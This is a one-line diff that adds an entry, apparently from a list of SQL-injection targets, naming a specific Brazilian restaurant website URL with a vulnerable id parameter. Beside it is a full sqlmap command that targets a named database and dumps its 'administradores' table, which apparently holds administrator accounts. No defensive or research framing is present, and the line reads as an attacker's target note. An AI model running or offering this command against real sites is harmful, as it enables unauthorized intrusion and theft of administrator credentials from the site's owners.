@@ -1,0 +1,1 @@
+http://www.frangoesse.com.br/gastronomia-detalhes.php?id=33 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.frangoesse.com.br/gastronomia-detalhes.php?id=33 -D frangobdsite18 -T administradores --dump
